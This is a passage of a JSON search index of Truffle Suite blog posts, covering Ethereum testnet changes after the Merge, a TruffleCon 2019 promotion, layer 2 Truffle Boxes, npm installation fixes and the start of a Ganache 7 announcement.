you\u2019ve noticed that with significant changes to the network like the Merge comes changes to testnets. If you\u2019re interested in understanding the journey so far and how the testnet landscape has changed over the years, check out this blog on The history of the Ethereum testnets . So far, we\u2019ve seen the deprecation of two popular testnets within the dapp developer ecosystem: Rinkeby and Ropsten. We\u2019ve also seen the deprecation of the Kiln testnet, which was initially setup for testing the Ethereum network post-merge. Although these networks have been deprecated and developers are advised not to use them moving forward, they are still up and running to allow enough time for users to transition, with the timelines for their complete shut down outlined here With Rinkeby, Ropsten, and Kiln deprecated, it frees up capacity and time for client developers to focus and provide long-term support for the two long-lived testnets going forward, Goerli and Sepolia. Dapp developers can access these testnets during development via Truffle Ganache , including the ability to fork them. These networks are also fully supported by Infura , the leading Ethereum node provider, so please check out the documentation to better understand how it works.", "title": "Testnets"}, {"location": "blog/how-the-merge-impacts-the-application-layer-and-developer-experience/#seamless-transition-to-pos", "text": "Since the start of the Merge, one goal that has remained constant for Truffle from a developer perspective is how seamless the transition from PoW to PoS is going to be. The Merge is designed to have very little impact on existing applications and developer tools by supporting backward compatibility as much as possible. At Truffle, we\u2019re excited about a PoS future for Ethereum and cannot wait for its full actualization, as well as the further performance and scalability improvements it sets the foundation for. You can hear directly from our engineers on what the Merge means for us and how we\u2019ve prepared for it .", "title": "Seamless transition to PoS"}, {"location": "blog/how-the-merge-impacts-the-application-layer-and-developer-experience/#ready-set-merge", "text": "As you can see, the Merge does impact the Ethereum application layer, even though in a minimal way. It introduces some opcode changes that dapp developers should be aware of when building on a PoS blockchain. It also introduces some changes to the developer tooling, most notable is the deprecation of popular testnets Rinkeby and Ropsten and the introduction of the new testnet Sepolia. To stay up to date with the Merge and how we are preparing for it at Truffle, subscribe to the Truffle newsletter by visiting our website today. We also hold monthly live streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Ready. Set. Merge!"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/", "text": "Last year Truffle Suite launched TruffleCon , an event designed for the Truffle community and those interested in building world-changing applications powered by decentralized technologies. The event was received with an overwhelmingly positive response. TruffleCon attracted 250 attendees, 53 speakers, and 2 locations. After such a successful inaugural event, the team immediately started planning an even bigger and better Trufflecon for 2019. Join us this year on August 2-4 at the Microsoft Campus in Redmond, WA for the second annual event for the Truffle community: those who actively build using Truffle\u2019s framework for development on Ethereum. Programming will include speakers from the blockchain ecosystem, along with hands-on workshops geared toward novice users and expert builders alike. There\u2019s truly something for developers of all experience levels! TruffleCon places focus on the developer by exploring the many ways in which the Truffle tools can enhance the development process by increasing efficiency and enabling high-quality dapp production. We know that attending a blockchain conference often comes down to ROI for your organization. With so many learning and growth opportunities, here are a few things to remind your boss about when asking to send you to the 2nd Annual TruffleCon . Truffle is widely considered the most popular tool for blockchain application development \u00b6 Truffle is widely considered the most popular tool for blockchain application development with over 1.5 million lifetime downloads. Truffle supports developers across the full lifecycle of their projects, whether they are looking to build on Ethereum, Hyperledger, Quorum, or one of an ever-growing list of other supported platforms. Paired with Ganache, a personal blockchain, and Drizzle, a front-end dapp development kit, the full Truffle suite of tools promises to be an end-to-end dapp development platform. Truffle is being used by the largest and most prominent firms \u00b6 If your company want to implement blockchain solutions, you\u2019ll need to learn how to interact with Truffle suite of products. Truffle is used by many fortune 500 firms and will be the first company to integrate with AxCore, a proprietary blockchain created by Goldman Sachs and JPMorgan-backed Axoni, which is scheduled to start processing $10 trillion worth of transactions annually for the DTCC\u2019s Trade Information Warehouse later this year. Here are some of the amazing companies using or integrating Truffle: * Microsoft, ConsenSys, Amazon, VMWare Airbus, General Dynamics, J.P. Morgan and more! * Soon to be your company too! Build dapps hands on and learn to deploy smart contracts \u00b6 TrufflCon will have something for everyone from the novice and crypto curious to the advanced blockchain developers and everyone in between. Truffle\u2019s world-class developers and trainers will be there to support you along your developer journey. You\u2019ll learn hands-on how to build dapps and deploy smart contracts during our workshops. Meet and learn from the creators of Truffle Suite: the ones closest to Truffle\u2019s development \u00b6 Tim Coulter \u00b6 Tim Coulter is the Founder and CEO of Truffle. Before blockchain, Tim built a career specializing in software testing and developer support, which became extremely valuable in the early days of blockchain development. He's now surrounded by an amazing team building the next generation of blockchain development tools, and can't wait to tell you about what's to come. Mike Seese \u00b6 Mike Seese is a Core Developer on the Enterprise Products team. In addition to integrating the Truffle Suite to other ledgers and frameworks, he strives to bring the modern development experience to the blockchain community. Josh Quintal \u00b6 Josh is passionate about where the user meets the tech; this led to the creation of two products, Truffle Boxes and Drizzle. He also created \"Pet Shop\", one of Ethereum's most used beginner tutorials. Besides his obvious technical prowess,Josh is also the most stylish member of the Truffle team. G. Nicholas D\u2019Andrea \u00b6 Ever since 2016, he has been obsessed with the decentralized future and working towards building core software components for the blockchain ecosystem. Besides his work on Truffle, he is a core contributor to the EthPM package management system and author of EIP-1123. Kevin Bluer \u00b6 He\u2019s building our world-class program at Truffle University from the ground up which trains existing software developers to become Truffle-certified blockchain engineers. Outside of his work with Truffle, he has trained and mentored developers in cities around the globe including New York, Austin, London, Hong Kong, Shenzhen, and Kuala Lumpur. TruffleCon is a place to meet our developers and work with them, ask questions, and get feedback on your work. TruffleCon is for developers by developers \u00b6 While there is no shortage of conferences in the blockchain space, TruffleCon is uniquely created for developers, by developers. Tim Coulter, Truffle\u2019s Founder & CEO, explained, \"Developers attach their identity to the tools they're using. People are congregating around Truffle and want to learn from and collaborate with the people who are using the tools. We aim to host a conference where people can engage with their peers and share insights on how best to use these tools. We hope attendees will leave inspired and that the knowledge shared will transform how people build.\" There will be lots of chocolate \u00b6 If your boss is still not convinced, most importantly, there will be A LOT of chocolate. Now, send this to your boss so they can send you to TruffleCon! Secure Your Spot for TruffleCon 2019 in Redmond, WA August 2-4, 2019. More 2019 announcements are on the way\u200a\u2014 Subscribe to the Truffle newsletter and join the conversation on Telegram in the TruffleCon Channel .", "title": "How to get your boss to send you to TruffleCon"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#truffle-is-widely-considered-the-most-popular-tool-for-blockchain-application-development", "text": "Truffle is widely considered the most popular tool for blockchain application development with over 1.5 million lifetime downloads. Truffle supports developers across the full lifecycle of their projects, whether they are looking to build on Ethereum, Hyperledger, Quorum, or one of an ever-growing list of other supported platforms. Paired with Ganache, a personal blockchain, and Drizzle, a front-end dapp development kit, the full Truffle suite of tools promises to be an end-to-end dapp development platform.", "title": "Truffle is widely considered the most popular tool for blockchain application development"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#truffle-is-being-used-by-the-largest-and-most-prominent-firms", "text": "If your company want to implement blockchain solutions, you\u2019ll need to learn how to interact with Truffle suite of products. Truffle is used by many fortune 500 firms and will be the first company to integrate with AxCore, a proprietary blockchain created by Goldman Sachs and JPMorgan-backed Axoni, which is scheduled to start processing $10 trillion worth of transactions annually for the DTCC\u2019s Trade Information Warehouse later this year. Here are some of the amazing companies using or integrating Truffle: * Microsoft, ConsenSys, Amazon, VMWare Airbus, General Dynamics, J.P. Morgan and more! * Soon to be your company too!", "title": "Truffle is being used by the largest and most prominent firms"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#build-dapps-hands-on-and-learn-to-deploy-smart-contracts", "text": "TrufflCon will have something for everyone from the novice and crypto curious to the advanced blockchain developers and everyone in between. Truffle\u2019s world-class developers and trainers will be there to support you along your developer journey. You\u2019ll learn hands-on how to build dapps and deploy smart contracts during our workshops.", "title": "Build dapps hands on and learn to deploy smart contracts"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#meet-and-learn-from-the-creators-of-truffle-suite-the-ones-closest-to-truffles-development", "text": "", "title": "Meet and learn from the creators of Truffle Suite: the ones closest to Truffle\u2019s development"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#tim-coulter", "text": "Tim Coulter is the Founder and CEO of Truffle. Before blockchain, Tim built a career specializing in software testing and developer support, which became extremely valuable in the early days of blockchain development. He's now surrounded by an amazing team building the next generation of blockchain development tools, and can't wait to tell you about what's to come.", "title": "Tim Coulter"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#mike-seese", "text": "Mike Seese is a Core Developer on the Enterprise Products team. In addition to integrating the Truffle Suite to other ledgers and frameworks, he strives to bring the modern development experience to the blockchain community.", "title": "Mike Seese"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#josh-quintal", "text": "Josh is passionate about where the user meets the tech; this led to the creation of two products, Truffle Boxes and Drizzle. He also created \"Pet Shop\", one of Ethereum's most used beginner tutorials. Besides his obvious technical prowess,Josh is also the most stylish member of the Truffle team.", "title": "Josh Quintal"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#g-nicholas-dandrea", "text": "Ever since 2016, he has been obsessed with the decentralized future and working towards building core software components for the blockchain ecosystem. Besides his work on Truffle, he is a core contributor to the EthPM package management system and author of EIP-1123.", "title": "G. Nicholas D\u2019Andrea"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#kevin-bluer", "text": "He\u2019s building our world-class program at Truffle University from the ground up which trains existing software developers to become Truffle-certified blockchain engineers. Outside of his work with Truffle, he has trained and mentored developers in cities around the globe including New York, Austin, London, Hong Kong, Shenzhen, and Kuala Lumpur. TruffleCon is a place to meet our developers and work with them, ask questions, and get feedback on your work.", "title": "Kevin Bluer"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#trufflecon-is-for-developers-by-developers", "text": "While there is no shortage of conferences in the blockchain space, TruffleCon is uniquely created for developers, by developers. Tim Coulter, Truffle\u2019s Founder & CEO, explained, \"Developers attach their identity to the tools they're using. People are congregating around Truffle and want to learn from and collaborate with the people who are using the tools. We aim to host a conference where people can engage with their peers and share insights on how best to use these tools. We hope attendees will leave inspired and that the knowledge shared will transform how people build.\"", "title": "TruffleCon is for developers by developers"}, {"location": "blog/how-to-get-your-boss-to-send-you-to-trufflecon/#there-will-be-lots-of-chocolate", "text": "If your boss is still not convinced, most importantly, there will be A LOT of chocolate. Now, send this to your boss so they can send you to TruffleCon! Secure Your Spot for TruffleCon 2019 in Redmond, WA August 2-4, 2019. More 2019 announcements are on the way\u200a\u2014 Subscribe to the Truffle newsletter and join the conversation on Telegram in the TruffleCon Channel .", "title": "There will be lots of chocolate"}, {"location": "blog/how-to-use-truffle-to-build-on-ethereum-layer-2-networks/", "text": "By Kingsley Arinze Layer 2 networks, also commonly referred to as \u201cL2s\u201d, are scaling solutions in the blockchain ecosystem. The Ethereum blockchain, due to its design and transaction demand, has become slow and expensive for everyday users transacting on the blockchain. To ensure Ethereum can scale, many core developers have been working rigourly on the (fast-approaching) Merge to Proof of Stake and several L2 solutions have emerged for faster and cheaper transactions. An L2 can simply be described as a server or a cluster of servers run by businesses, third-party operators, or even a group of individuals, that accepts and processes transactions off-chain by rolling up these transactions into batches before sending them back to a layer 1 chain like Ethereum. In decentralized networks, the \u201cScalability Trilemma'' refers to the idea that a network cannot be decentralized , secure , and scalable at the same time. The Trilemma states that for a blockchain network to exist, it would have to make a tradeoff, leaving out one of these three aspects. This is why today, there are a myriad of blockchain layer 1 like Solana and NEAR and layer 2 chains like Arbitrum, Polygon, and Optimism to choose from. Each promises its own set of advantages and disadvantages, depending on which aspects of the Scalability Trilemma it chooses to solve. Layer 2s and the Ethereum ecosystem \u00b6 The Ethereum ecosystem has a number of layer 2 solutions available today which can be broadly classified as either \u201cuse-case specific\u201d or \u201cgeneralized\u201d layer 2. These scaling solutions use a different underlying technology to offer scalability for the Ethereum blockchain: State Channels allow users to transact an arbitrary number of times off-chain, while only sending two transactions to the Ethereum mainnet. Rollups perform transactions outside layer 1, before posting a compressed version of these transactions to the layer 1 blockchain, thereby relying on its native security. There are two classes of rollups: Optimistic rollups Zero Knowledge rollups Sidechains are parallel running, EVM-compatible blockchains that run based on their own consensus mechanism and use a two-way bridge to communicate with the Ethereum mainnet. You can learn more about Ethereum layer 2 solutions in these ConsenSys blogs . Benefits of Layer 2 solutions \u00b6 As stated earlier, the Ethereum blockchain suffers from slow transaction speed and high gas costs, especially during network spikes, mostly due to its initial design that favors decentralization and security over scalability. Some of the ways in which layer 2s are improving the Ethereum user experience are: Greater transaction throughput because L2s perform computations outside Ethereum (off-chain) and only have to post compressed transaction data to the mainnet, thus transaction speed is significantly improved. Reduced transaction fees by bundling a handful of transactions into a single transaction before sending them to the mainnet means way less transaction fees. Increased security due to trustless proving mechanisms such as zero knowledge cryptography. Some use game theory and staked value for fraud proofs. Expanded use cases like gaming and NFTs are not effective with the current transaction speed and cost, Layer 2s help tackle these problems. How is Truffle making building on Layer 2 easy? \u00b6 At Truffle, our goal is to make building on Ethereum and other EVM-compatible blockchains and L2 networks as seamless as possible by providing the necessary tools developers need to build dapps. We\u2019ve created simple Truffle Boxes that enable developers to learn quickly, by providing all the necessary boilerplate code and structure required to compile, migrate, test, and deploy smart contracts on layer 2 networks. At the moment, we currently support 3 Truffle Boxes that focus on rollups and side chains and are working on adding to this collection. The 3 layer 2 Truffle Boxes we currently have are: The Optimism Truffle box The Arbitrum Truffle box The Polygon Truffle box To use these boxes, you must have the following softwares installed on your local machine: Node.js 10.x or later NPM version 5.2 or later Docker version 19.03.12 or later Docker-compose version 1.27.3 or later With these requirements sorted out, you can install a new box with the command: $ truffle unbox <BOX NAME> for example $ truffle unbox optimism . This should create a new optimism project with the necessary files and folder structure. If you\u2019re curious to learn how you can build a dapp using our Optimism box, we\u2019ve created an easy to follow tutorial which you can use. For more information about our exciting boxes and the upcoming ones, visit the official Truffle boxes documentation .", "title": "How to use Truffle to build on Ethereum Layer 2 networks"}, {"location": "blog/how-to-use-truffle-to-build-on-ethereum-layer-2-networks/#layer-2s-and-the-ethereum-ecosystem", "text": "The Ethereum ecosystem has a number of layer 2 solutions available today which can be broadly classified as either \u201cuse-case specific\u201d or \u201cgeneralized\u201d layer 2. These scaling solutions use a different underlying technology to offer scalability for the Ethereum blockchain: State Channels allow users to transact an arbitrary number of times off-chain, while only sending two transactions to the Ethereum mainnet. Rollups perform transactions outside layer 1, before posting a compressed version of these transactions to the layer 1 blockchain, thereby relying on its native security. There are two classes of rollups: Optimistic rollups Zero Knowledge rollups Sidechains are parallel running, EVM-compatible blockchains that run based on their own consensus mechanism and use a two-way bridge to communicate with the Ethereum mainnet. You can learn more about Ethereum layer 2 solutions in these ConsenSys blogs .", "title": "Layer 2s and the Ethereum ecosystem"}, {"location": "blog/how-to-use-truffle-to-build-on-ethereum-layer-2-networks/#benefits-of-layer-2-solutions", "text": "As stated earlier, the Ethereum blockchain suffers from slow transaction speed and high gas costs, especially during network spikes, mostly due to its initial design that favors decentralization and security over scalability. Some of the ways in which layer 2s are improving the Ethereum user experience are: Greater transaction throughput because L2s perform computations outside Ethereum (off-chain) and only have to post compressed transaction data to the mainnet, thus transaction speed is significantly improved. Reduced transaction fees by bundling a handful of transactions into a single transaction before sending them to the mainnet means way less transaction fees. Increased security due to trustless proving mechanisms such as zero knowledge cryptography. Some use game theory and staked value for fraud proofs. Expanded use cases like gaming and NFTs are not effective with the current transaction speed and cost, Layer 2s help tackle these problems.", "title": "Benefits of Layer 2 solutions"}, {"location": "blog/how-to-use-truffle-to-build-on-ethereum-layer-2-networks/#how-is-truffle-making-building-on-layer-2-easy", "text": "At Truffle, our goal is to make building on Ethereum and other EVM-compatible blockchains and L2 networks as seamless as possible by providing the necessary tools developers need to build dapps. We\u2019ve created simple Truffle Boxes that enable developers to learn quickly, by providing all the necessary boilerplate code and structure required to compile, migrate, test, and deploy smart contracts on layer 2 networks. At the moment, we currently support 3 Truffle Boxes that focus on rollups and side chains and are working on adding to this collection. The 3 layer 2 Truffle Boxes we currently have are: The Optimism Truffle box The Arbitrum Truffle box The Polygon Truffle box To use these boxes, you must have the following softwares installed on your local machine: Node.js 10.x or later NPM version 5.2 or later Docker version 19.03.12 or later Docker-compose version 1.27.3 or later With these requirements sorted out, you can install a new box with the command: $ truffle unbox <BOX NAME> for example $ truffle unbox optimism . This should create a new optimism project with the necessary files and folder structure. If you\u2019re curious to learn how you can build a dapp using our Optimism box, we\u2019ve created an easy to follow tutorial which you can use. For more information about our exciting boxes and the upcoming ones, visit the official Truffle boxes documentation .", "title": "How is Truffle making building on Layer 2 easy?"}, {"location": "blog/how-were-making-installation-issues-a-thing-of-the-past/", "text": "**Update**: Since this blog post was published, we have released [Ganache](/ganache) a personal blockchain and a replacement to the TestRPC. We have left this post unaltered, but we highly recommend checking out our [Ganache Quickstart](/docs/ganache/quickstart) page. It doesn't matter what operating system you're on -- if you've used Truffle in any capacity, you've likely run into an install issue in some form or another. This is especially true for Windows, as Windows doesn't generally ship with the necessary tools to install all of Truffle's important dependencies. And for most users, this sucks: getting hung up on installation is incredibly frustrating when you're usually just one error message or two away from creating your first Ethereum-enabled application. Well, I've got good news. As of the latest Truffle beta release, I'm happy to tell you that this is an issue no longer. That's right: No matter what platform you're on, your install issues should be over. This is big. In order to completely sidestep most if not all of the most common installation issues, we had to overcome some technical difficulties as well as rethink how we ship our code. In this post, I'm going to tell you about what we did and how that made installation incredibly simpler, on every platform, for everyone. So what was the problem? \u00b6 Since Truffle is a Javascript-based application, we (naturally) ship our code using the Node Package Manager (NPM for short). NPM hosts thousands if not millions of code packages, and it's the service that makes modern Javascript programming possible. Without NPM, not only would programming Truffle be nearly impossible, but programming anything complex in Javascript would be impossible: NPM lets developers separate and bundle code into its own individual chunks, called \"packages\", that any of those other chunks (packages) can then rely on. Because of NPM, Truffle is standing on the shoulders of giants. Truffle relies on the code of so many other people that if you looked at the full list you'd be hard pressed to give us credit for the codebase. And that's the beauty of it: packages like hashing functions and cryptographic libraries -- hard libraries to write (and get right!) -- we don't have to write ourselves. Though using dependencies on NPM has significant upsides, it also comes with significant drawbacks. Those same hashing functions -- functions used throughout Ethereum -- are written to be extremely performant, and so are written in C. In order to install those packages, NPM has to be able to compile them on the fly during installation, which means every Truffle user needs to have a C compiler installed. Additionally, NPM (for some reason) uses Python during the compilation process, which means Truffle users also need to have Python installed. Bottom line: In order to install a Javascript project, Truffle users need both C and Python. This is madness. So what can we do? \u00b6 Most of the issues people were seeing stem from the compilation process mentioned: Either they didn't have the right compilers/interpreters installed for C and Python, or C and Python itself required some dependency that wasn't properly installed. We've had a tutorial written for awhile that shows Windows users how to correctly set up their environment and get everything installed, but this required considerable effort from novice users and didn't take into account the many landmines hiding around every corner, waiting to explode at any moment. So we can't \"instruct\" our way around this problem. The only way to fix it, then, is to sidestep it completely. Sidestepping the compilation process means completely excising any compilation out of the installation process. The way we chose to tackle this is two ways: Remove any unnecessary dependencies that rely on compilation. Replace dependencies that need compilation with versions 100% written in Javascript. In theory this sounds easy: i.e., \"just use the Javascript versions or don't use the C versions as all\". In practice, this is much harder. Often, we don't directly control the dependencies our application relies on, because dependencies of dependencies (of dependencies of dependencies) might rely on a package that requires compilation. Since the bad apples are the packages that power the code we rely on (i.e., they're \"indirect dependencies\"), we have to surgically remove them and replace them with versions that install and function more easily. This is no small matter. Thankfully, a tool exists that makes this surgical replacement possible. It's called Webpack . Webpack bills itself as a Javascript bundler, aiming to mash together all your project's dependencies into a single blob of code, i.e., a \"bundle\". Webpack finds most of its uses in browser applications, as browsers need to download all code first before a website can be displayed, and it's more performant for the browser to download that code in a single request. However, for console applications like Truffle, Webpack can still be immensely valuable. By creating a bundle with Webpack, we can control exactly which dependencies get included in it. Take js-scrypt for instance. This library provides hashing functions required by Ethereum, is 100% written in Javascript, and is API-compatible with the C-compiled node-scrypt library. With Webpack, we can simply remove scrypt and replace it with js-scrypt like nothing happened. How about another example: Let's do IPFS. Truffle relies on the ethpm-js package to provide EthPM support, which itself relies on the ipfs package to communicate with IPFS servers. Somewhere deep down in ipfs 's dependency tree, some code needs the execSync package, a package that causes installation issues for some users. Using Webpack, when creating our bundle, we can just not include it . Since that code only matters for parts of IPFS that Truffle doesn't use, that code doesn't need to be in our bundle. Ex-nay, gone-yay . Zip, zilch, completely gone. Creating a bundle for our releases instead of letting NPM manage dependencies has other benefits as well. To keep code modular and maintainable, Truffle relies on almost 2000 packages! (This includes the dependencies of dependencies we mentioned before). Bundling ahead of time creates a single file users have to download during installation instead of requiring NPM to make requests for all 2000 dependencies. So not only do we get to sidestep all of the installation issues, but we make installation nearly instant as well. Yep. Feel free to party. We did. \ud83c\udf89 So how can you get it? \u00b6 Bundling Truffle's dependencies means releasing a version of the code where certain dependencies have been either replaced or removed. This not only means releasing structurally new code, but it means releasing code that has differing testability characteristics which change our ability to ensure its of the quality you've come to expect. We need to build infrastructure to help us do that, so in the meantime we've released the new version of the code in beta. To get the beta version of Truffle, first uninstall the version you currently have (they'll conflict): $ npm uninstall -g truffle And now install the beta version: $ npm install -g truffle@beta You'll notice that the beta version installs almost instantly, and no compilation is required. Hot-dog. So what's next? \u00b6 As we gain responses from the community about this new version we'll likely make changes to ensure we've sidestepped all the installation issues that have plagued users in the past. Once that's finished we'll make an official release. As well, we'll be performing this same work for the TestRPC in the coming weeks to ensure the TestRPC has the same hassle-free, instant installation that you'll soon come to expect from Truffle. If you run into issues with the beta version, don't hesitate to write up an issue in our issue tracker or reach out on the community GitHub Discussions channel , where hundreds of your fellow Trufflers congregate to answer your questions. Cheers, and we appreciate your ongoing support and feedback. -- Tim & the Truffle Team", "title": "How we're making installation issues a thing of the past"}, {"location": "blog/how-were-making-installation-issues-a-thing-of-the-past/#so-what-was-the-problem", "text": "Since Truffle is a Javascript-based application, we (naturally) ship our code using the Node Package Manager (NPM for short). NPM hosts thousands if not millions of code packages, and it's the service that makes modern Javascript programming possible. Without NPM, not only would programming Truffle be nearly impossible, but programming anything complex in Javascript would be impossible: NPM lets developers separate and bundle code into its own individual chunks, called \"packages\", that any of those other chunks (packages) can then rely on. Because of NPM, Truffle is standing on the shoulders of giants. Truffle relies on the code of so many other people that if you looked at the full list you'd be hard pressed to give us credit for the codebase. And that's the beauty of it: packages like hashing functions and cryptographic libraries -- hard libraries to write (and get right!) -- we don't have to write ourselves. Though using dependencies on NPM has significant upsides, it also comes with significant drawbacks. Those same hashing functions -- functions used throughout Ethereum -- are written to be extremely performant, and so are written in C. In order to install those packages, NPM has to be able to compile them on the fly during installation, which means every Truffle user needs to have a C compiler installed. Additionally, NPM (for some reason) uses Python during the compilation process, which means Truffle users also need to have Python installed. Bottom line: In order to install a Javascript project, Truffle users need both C and Python. This is madness.", "title": "So what was the problem?"}, {"location": "blog/how-were-making-installation-issues-a-thing-of-the-past/#so-what-can-we-do", "text": "Most of the issues people were seeing stem from the compilation process mentioned: Either they didn't have the right compilers/interpreters installed for C and Python, or C and Python itself required some dependency that wasn't properly installed. We've had a tutorial written for awhile that shows Windows users how to correctly set up their environment and get everything installed, but this required considerable effort from novice users and didn't take into account the many landmines hiding around every corner, waiting to explode at any moment. So we can't \"instruct\" our way around this problem. The only way to fix it, then, is to sidestep it completely. Sidestepping the compilation process means completely excising any compilation out of the installation process. The way we chose to tackle this is two ways: Remove any unnecessary dependencies that rely on compilation. Replace dependencies that need compilation with versions 100% written in Javascript. In theory this sounds easy: i.e., \"just use the Javascript versions or don't use the C versions as all\". In practice, this is much harder. Often, we don't directly control the dependencies our application relies on, because dependencies of dependencies (of dependencies of dependencies) might rely on a package that requires compilation. Since the bad apples are the packages that power the code we rely on (i.e., they're \"indirect dependencies\"), we have to surgically remove them and replace them with versions that install and function more easily. This is no small matter. Thankfully, a tool exists that makes this surgical replacement possible. It's called Webpack . Webpack bills itself as a Javascript bundler, aiming to mash together all your project's dependencies into a single blob of code, i.e., a \"bundle\". Webpack finds most of its uses in browser applications, as browsers need to download all code first before a website can be displayed, and it's more performant for the browser to download that code in a single request. However, for console applications like Truffle, Webpack can still be immensely valuable. By creating a bundle with Webpack, we can control exactly which dependencies get included in it. Take js-scrypt for instance. This library provides hashing functions required by Ethereum, is 100% written in Javascript, and is API-compatible with the C-compiled node-scrypt library. With Webpack, we can simply remove scrypt and replace it with js-scrypt like nothing happened. How about another example: Let's do IPFS. Truffle relies on the ethpm-js package to provide EthPM support, which itself relies on the ipfs package to communicate with IPFS servers. Somewhere deep down in ipfs 's dependency tree, some code needs the execSync package, a package that causes installation issues for some users. Using Webpack, when creating our bundle, we can just not include it . Since that code only matters for parts of IPFS that Truffle doesn't use, that code doesn't need to be in our bundle. Ex-nay, gone-yay . Zip, zilch, completely gone. Creating a bundle for our releases instead of letting NPM manage dependencies has other benefits as well. To keep code modular and maintainable, Truffle relies on almost 2000 packages! (This includes the dependencies of dependencies we mentioned before). Bundling ahead of time creates a single file users have to download during installation instead of requiring NPM to make requests for all 2000 dependencies. So not only do we get to sidestep all of the installation issues, but we make installation nearly instant as well. Yep. Feel free to party. We did. \ud83c\udf89", "title": "So what can we do?"}, {"location": "blog/how-were-making-installation-issues-a-thing-of-the-past/#so-how-can-you-get-it", "text": "Bundling Truffle's dependencies means releasing a version of the code where certain dependencies have been either replaced or removed. This not only means releasing structurally new code, but it means releasing code that has differing testability characteristics which change our ability to ensure its of the quality you've come to expect. We need to build infrastructure to help us do that, so in the meantime we've released the new version of the code in beta. To get the beta version of Truffle, first uninstall the version you currently have (they'll conflict): $ npm uninstall -g truffle And now install the beta version: $ npm install -g truffle@beta You'll notice that the beta version installs almost instantly, and no compilation is required. Hot-dog.", "title": "So how can you get it?"}, {"location": "blog/how-were-making-installation-issues-a-thing-of-the-past/#so-whats-next", "text": "As we gain responses from the community about this new version we'll likely make changes to ensure we've sidestepped all the installation issues that have plagued users in the past. Once that's finished we'll make an official release. As well, we'll be performing this same work for the TestRPC in the coming weeks to ensure the TestRPC has the same hassle-free, instant installation that you'll soon come to expect from Truffle. If you run into issues with the beta version, don't hesitate to write up an issue in our issue tracker or reach out on the community GitHub Discussions channel , where hundreds of your fellow Trufflers congregate to answer your questions. Cheers, and we appreciate your ongoing support and feedback. -- Tim & the Truffle Team", "title": "So what's next?"}, {"location": "blog/introducing-ganache-7/", "text": "By Kingsley Arinze, Mei Chan and David Murdoch Ganache is a pioneer in the Ethereum development space, aiding DApp developers and enthusiasts to build, test, and explore blockchain since 2016. We are excited to announce the wide release of the latest version of Ganache today, with 30 times faster forking performance and an Infura integration that allows you to replay historical transactions with free access to archive data. For the uninitiated, Ganache is a local development blockchain used to develop decentralized applications on the Ethereum blockchain. It simulates the Ethereum network, and you can see how your DApp will perform before you release it to production. Typically, to start developing distributed applications on the Ethereum network, you will need to set up an Ethereum client such as Geth or OpenEthereum to provide you access to an Ethereum Virtual Machine (EVM) . Although that is a great way to develop distributed applications on Ethereum, it is not the most efficient and user-friendly approach, as you need to configure these clients manually and keep them running. Maintaining a self-hosted node can be expensive and time-consuming, you don\u2019t want to spend valuable time troubleshooting a failed node during development. With Ganache, all you need to do is start the application and you have a preconfigured Ethereum client with 10 pre-funded and unlocked accounts ready for use. This allows you to quickly test your DApp throughout your development cycle. Ganache 7: 30x faster forking and operations \u00b6 Many Web3 developers building on Ethereum already use Ganache to fork and test smart contracts in their local environments for confidence before deployment. Armed with the knowledge gained from previous iterations, we rewrote Ganache from the ground up with the mission to make the blockchain simulator tool even more flexible, faster, and more stable. We heard your feedback that Ganache v6 was slow to install, slow to run, and leaked memory. It also didn\u2019t use the modern language features and paradigms developers use today, like TypeScript types and the Promise abstraction. Ganache v6\u2019s architecture made testing, fixing bugs, and adding features difficult and time-consuming. How is Ganache v7 better? With advanced caching capabilities on the latest version, Ganache's forking feature is up to 30 times faster than v6. Zero-config Mainnet forking! Ganache v7 has a native integration with Infura which enables free access to historical data You can run Ganache indefinitely without running into crashes due to memory issues Common operations are about 3 times faster than v6. Installing and Setting up Ganache 7 \u00b6 Ganache can be used in many ways, including as a command-line tool, programmatically via Node.js, or in the browser. See the instructions below for installing and using Ganache 7 for all these use cases. A. Using Ganache 7 On the command line \u00b6 To run Ganache 7 on the command line, you must have Node.js >= v12.0.0 and NPM >= 6.4.1 installed on your computer. See here to download the latest version for your operating system, or use nvm to manage your Node installation for Unix or Windows . With Node.js and NPM installed, you can install Ganache 7 globally by running npm install ganache --global . Once installed, you can run ganache from anywhere in your command line. Your terminal should look like this: By default, Ganache provides 10 test accounts, each with 1000 (fake) Ether along with the corresponding private keys and the mnemonic phrase used to generate them. You can use this phrase to import the accounts into wallets like MetaMask during development. We can override all defaults by specifying options when starting Ganache 7; for example, we can have more control over account creation by providing a mapping of private keys to account balances like so: ganache --wallet.accounts \"0xfd485338e322f5930f7cf475f385341ec88bfc4f8a0a16f30b2fb417d1bb5427, 1000000000000000000000\" \"0x05bba0b9f7a251080aa23feee4eab3f75a1abee905c0271008c93e5d2e2e7541, 10000000000000000000000\" We can also specify a mnemonic phrase to derive all initial accounts from, a miner gas price, and the block gas limit. For example: ganache --miner.defaultGasPrice 200 --miner.blockGasLimit 90071 --miner.callGasLimit 898989 --wallet.mnemonic \"alarm cause brave super lab glide awake hunt rose win sugar idea\" Run the command ganache --help for a list of all the available options you can pass to Ganache. We can also install ganache into a local Node.js project using npm install ganache without the --global flag, then add it to your project\u2019s package.json scripts , e.g., \"scripts\": {\"ganache\": \"ganache --mnemonic <12 words mnemonic>\"} . B. Using Ganache 7 programmatically \u00b6 Ganache 7 can be used programmatically in your Node.js project as: A standalone EIP-1193 provider, A JSON-RPC server and EIP-1193 provider, A web3.js provider and An ethers.js provider. See code samples for these different use cases below. To begin, install Ganache 7 as npm package in your Node.js project $ npm install ganache As a standalone EIP-1193 provider const ganache = require ( \"ganache\" ); const options = {}; const provider = ganache . provider ( options ); const accounts = await provider . request ({ method : \"eth_accounts\" , params : [] }); ... As a JSON-RPC web server and an EIP-1193 provider const ganache = require ( \"ganache\" ); const options = 